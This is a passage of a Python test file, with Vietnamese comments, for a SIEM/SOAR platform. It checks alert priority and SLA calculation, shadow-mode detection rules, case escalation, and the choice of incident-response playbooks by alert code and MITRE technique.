    alert = {"alert": {"id": "a3", "source": "rule"}, "rule": {"id": "AUTH-002", "name": "x"}, "severity": "critical",
             "severity_score": 4, "source": {"ip": "10.9.9.9"}, "agent": {"id": "S001-Web-01"}, "count": 6, "message": "x"}
    soar.handle(alert)
    case = next(iter(es.docs["siem-cases"].values()))
    assert case["playbook"]["id"] == "PB-09" and case["priority"] == "P1" and case["sla_due"]
    assert len(case["tasks"]) >= 8 and case["status"] == "open"


# ------------------------------------------------------------------ ưu tiên P1-P4, SLA, rule chạy bóng
def test_priority_matrix_by_asset_criticality():
    """Ưu tiên = severity × mức quan trọng tài sản; tài sản không có trong danh mục = medium (giữ cách tính cũ)."""
    from siem.priority import DEFAULT_MATRIX, DEFAULT_SLA, Policy, higher, met
    p = Policy.load(ROOT / "config" / "priority.yml")
    assert p.matrix == DEFAULT_MATRIX and p.sla == DEFAULT_SLA                    # file cấu hình = bảng mặc định
    assert [p.priority(s) for s in ("critical", "high", "medium", "low")] == ["P1", "P2", "P3", "P4"]
    assert p.priority("high", "critical") == "P1" and p.priority("medium", "critical") == "P2"
    assert p.priority("critical", "low") == "P2" and p.priority("low", "khong-ro") == "P4"
    d = p.dues("2026-10-13T10:00:00+00:00", "P1")
    assert d == {"ack_due": "2026-10-13T10:15:00+00:00", "contain_due": "2026-10-13T11:00:00+00:00"}
    assert higher("P1", "P2") and higher("P2", None) and not higher("P3", "P1") and not higher(None, "P4")
    assert met("2026-10-13T10:10:00+00:00", d["ack_due"]) is True
    assert met("2026-10-13T10:20:00+00:00", d["ack_due"]) is False
    with pytest.raises(ValueError):
        Policy({"high": ("P1", "P2")})


def test_alert_priority_detection_time_and_shadow_mode():
    """Alert mang ưu tiên theo tài sản và thời gian phát hiện từ event ĐẦU TIÊN của chuỗi (KPI MTTD); rule `mode:
    shadow` sinh alert gắn alert.shadow."""
    from siem.detection.rules import Rule
    rule = Rule.from_dict({"id": "T-001", "title": "thử", "severity": "high", "type": "threshold", "mode": "shadow",
                           "condition": {"field": "event.outcome", "op": "eq", "value": "failure"},
                           "threshold": {"count": 3, "window": 600, "group_by": ["source.ip"]}})
    eng = RuleEngine([rule])
    dets = []
    for i in range(3):
        dets += eng.process({"@timestamp": (T0 + timedelta(seconds=60 * i)).isoformat(), "event": {
            "id": f"e{i}", "outcome": "failure"}, "source": {"ip": "203.0.113.5"},
            "asset": {"criticality": "critical"}})
    assert len(dets) == 1 and dets[0].first_time == T0.timestamp()
    a = alert_builder.from_detection(dets[0])
    assert a["priority"] == "P1" and a["first_event_time"] == T0.isoformat()
    assert a["metrics"]["ttd_seconds"] > 0 and a["alert"]["shadow"] is True and a["rule"]["mode"] == "shadow"
    with pytest.raises(ValueError, match="mode"):
        Rule.from_dict({"id": "T-2", "title": "x", "mode": "test", "condition": {"field": "a", "op": "exists"}})


def test_soar_ignores_shadow_alerts_and_case_inherits_priority():
    from siem.soar.cases import CasePlaybooks
    from siem.soar.engine import Notifier, Soar, load_playbooks
    es = FakeES()
    soar = Soar(es, load_playbooks(ROOT / "config" / "playbooks.yml"), whitelist=[], notifier=Notifier(),
                case_playbooks=CasePlaybooks(ROOT / "config" / "case_playbooks.yml"))
    base = {"rule": {"id": "WEB-001", "name": "SQLi", "tags": []}, "severity": "high", "severity_score": 3,
            "source": {"ip": "203.0.113.5"}, "agent": {"id": "001"}, "message": "x"}
    assert soar.handle({**base, "alert": {"id": "s1", "source": "rule", "shadow": True}}) == []
    assert "siem-cases" not in es.docs and "siem-actions" not in es.docs
    # máy chủ critical: alert high thành P1, case P1 với hạn xác nhận 15 phút / khoanh vùng 60 phút
    soar.handle({**base, "alert": {"id": "a1", "source": "rule"}, "priority": "P1"})
    case = next(iter(es.docs["siem-cases"].values()))
    assert case["priority"] == "P1" and case["sla_due"] == case["sla"]["ack_due"]
    gap = datetime.fromisoformat(case["sla"]["contain_due"]) - datetime.fromisoformat(case["created_at"])
    assert gap == timedelta(minutes=60)


def test_case_add_alert_script_escalates_priority():
    """Painless gom alert vào case: alert ưu tiên cao hơn nâng ưu tiên case và kéo hạn SLA về sớm hơn (kiểm tra tham
    số script dùng đúng tên SOAR truyền vào)."""
    import re
    from siem.soar.engine import CASE_ADD_ALERT
    used = set(re.findall(r"params\.(\w+)", CASE_ADD_ALERT))
    assert used == {"id", "max", "now", "prio", "ack_due", "contain_due"}
    assert "compareTo(ctx._source.priority) < 0" in CASE_ADD_ALERT


def test_case_playbooks_from_soc_plan_catalog():
    """Danh mục playbook ưu tiên của kế hoạch SOC (13/10/2026): nền tảng giám sát, rò rỉ dữ liệu, nội bộ, chiếm tài khoản
    cloud / email, khai thác lỗ hổng; chọn theo mã alert nền tảng, kỹ thuật cụ thể nhất, tag nhóm rule Wazuh."""
    from siem.manager.api import APPROVAL_PERMISSIONS
    from siem.soar.cases import CasePlaybooks
    cp = CasePlaybooks(ROOT / "config" / "case_playbooks.yml")
    pick = lambda rid, tech=(), tags=(): cp.select(rid, list(tech), list(tags))[0]["id"]      # noqa: E731
    assert pick("HLT-002", ["T1562.001"]) == "PB-20"                     # mã alert nền tảng trước kỹ thuật (PB-17)
    assert pick("AI-300", ["T1567.002"]) == "PB-21" and pick("AI-301", ["T1078.004"]) == "PB-23"
    assert pick("AI-302", ["T1550.001"]) == "PB-23" and pick("AI-303", ["T1550.002"]) == "PB-16"
    assert pick("AI-304", ["T1078"]) == "PB-09" and pick("AI-305", ["T1068"]) == "PB-24"
    assert pick("WZH-23505", tags=["wazuh", "vulnerability-detector"]) == "PB-24" and pick("X", tags=["insider"]) == "PB-22"
    assert pick("TI-002", ["T1071"]) == "PB-06" and APPROVAL_PERMISSIONS["SOC Manager"] == "declare"
    insider = cp.build("X", "high", tags=["insider"])
    assert any(t["approval"] == "SOC Manager" and "Đóng băng quyền" in t["title"] for t in insider["tasks"])
